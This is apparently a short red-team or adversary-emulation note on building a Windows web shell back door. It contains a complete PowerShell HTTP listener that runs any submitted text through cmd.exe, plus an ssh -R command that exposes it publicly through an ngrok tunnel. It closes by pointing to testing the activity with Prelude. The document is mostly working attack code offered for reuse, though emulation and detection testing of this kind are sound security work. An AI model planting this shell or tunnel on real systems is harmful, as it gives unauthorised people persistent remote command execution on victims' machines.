### Create a Web Shell back Door, Connect Over Ngrok SSH Gateway.

[Ngrok SSH Gateway](https://ngrok.com/docs#ssh-gateway)

### Create Your SSH Keys On Windows.  Upload Your Keys to ngrok

```
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (C:\Users\mobile/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in C:\Users\mobile/.ssh/id_rsa.
Your public key has been saved in C:\Users\mobile/.ssh/id_rsa.pub.
```

![Screen Shot 2021-06-25 at 8 42 53 PM](https://user-images.githubusercontent.com/83469949/123499713-efb12580-d5f5-11eb-8c84-6caa656e36f1.png)

### Execute Simple Web Shell

```
<#
  .SYNOPSIS
  
  Simple Web Shell over HTTP
  
#>

$Server = '127.0.0.1' #Listening IP. Change This. Or make it a parameter, I don't care ;-)

function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   $cmd = $output.Split("=")
   $OutputVariable = &{ cmd.exe /c $cmd[1].Split("+") | Out-String}
   return $OutputVariable
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:8080/') 

$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	
	if ($request.Url -match '/shellPost$' -and ($request.HttpMethod -eq "POST") ) { 
		
		$message = Receive-Request($request);
		
	}
    if ($request.Url -match '/shell$' -and ($request.HttpMethod -eq "GET")) {
		$enc = [system.Text.Encoding]::UTF8
		$response.ContentType = 'text/html'
		$shellcode = '<form action="/shellPost" method="POST" >
					  Command:<br>
					  <input type="text" name="Command" value="ipconfig.exe"><br>
					  <input type="submit" value="Submit">
					</form>'
		
		$buffer = $enc.GetBytes($shellcode)		
		$response.ContentLength64 = $buffer.length
		$output = $response.OutputStream
		$output.Write($buffer, 0, $buffer.length)
		$output.Close()
		continue
	}
    

    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
```

Note the local port your Web Shell is listening to is 8080.  

### Create your ngrok tunnel To expose the local web shell externally.

`ssh -R webshell.ngrok.io:80:localhost:8080 tunnel.us.ngrok.com http`

### Connect to webshell.ngrok.io/shell

![Screen Shot 2021-06-25 at 8 46 08 PM](https://user-images.githubusercontent.com/83469949/123499793-68b07d00-d5f6-11eb-9401-8ec32bf22b4b.png)

### Now recreate this activity , and delivery and test with Prelude.



